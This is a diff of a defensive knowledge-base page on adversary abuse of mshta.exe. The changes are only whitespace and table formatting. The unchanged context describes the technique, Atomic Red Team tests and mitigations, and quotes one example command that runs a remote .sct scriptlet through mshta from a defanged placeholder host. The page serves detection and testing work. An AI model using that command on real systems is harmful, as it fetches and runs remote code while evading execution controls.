@@ -51,9 +51,9 @@ severity_boost:
 
 ## High-Level Description
 
-Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code 
+Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code
 
-Mshta.exe is a utility that executes Microsoft HTML Applications (HTA) files. HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. 
+Mshta.exe is a utility that executes Microsoft HTML Applications (HTA) files. HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser.
 
 Files may be executed by mshta.exe through an inline script: <code>mshta vbscript:Close(Execute("GetObject(""script:https[:]//webserver/payload[.]sct"")"))</code>
 
@@ -128,6 +128,7 @@ Invoke-ATHHTMLApplication -HTAFilePath #{hta_file_path} -ScriptEngine #{script_e
 ```
 
 **Dependencies:**
+
 - The AtomicTestHarnesses module must be installed and Invoke-ATHHTMLApplication must be exported in the module.
 
 ### Atomic Test 5: Invoke HTML Application - Jscript Engine Simulating Double Click
@@ -141,8 +142,8 @@ Invoke-ATHHTMLApplication -HTAFilePath #{hta_file_path} -ScriptEngine #{script_e
 ```
 
 **Dependencies:**
-- The AtomicTestHarnesses module must be installed and Invoke-ATHHTMLApplication must be exported in the module.
 
+- The AtomicTestHarnesses module must be installed and Invoke-ATHHTMLApplication must be exported in the module.
 
 ### Manual Testing
 
@@ -157,29 +158,28 @@ If Atomic Red Team tests are not applicable, manually verify the technique by:
 ## Remediation Guide
 
 ### M1038 Execution Prevention
+
 Use application control configured to block execution of <code>mshta.exe</code> if it is not required for a given system or network to prevent potential misuse by adversaries. For example, in Windows 10 and Windows Server 2016 and above, Windows Defender Application Control (WDAC) policy rules may be applied to block the <code>mshta.exe</code> application and to prevent abuse.
 
 ### M1042 Disable or Remove Feature or Program
-Mshta.exe may not be necessary within a given environment since its functionality is tied to older versions of Internet Explorer that have reached end of life.
 
+Mshta.exe may not be necessary within a given environment since its functionality is tied to older versions of Internet Explorer that have reached end of life.
 
 ## Detection
 
 ### Detecting Mshta-based Proxy Execution via Suspicious HTA or Script Invocation
 
-
 ## Risk Assessment
 
-| Finding | Severity | Impact |
-| ------- | -------- | ------ |
-| Mshta technique applicable | Medium | Defense Evasion |
+| Finding                    | Severity | Impact          |
+| -------------------------- | -------- | --------------- |
+| Mshta technique applicable | Medium   | Defense Evasion |
 
 ## CWE Categories
 
-| CWE ID | Title |
-| ------ | ----- |
+| CWE ID  | Title                        |
+| ------- | ---------------------------- |
 | CWE-693 | Protection Mechanism Failure |
-
 
 ## References
 
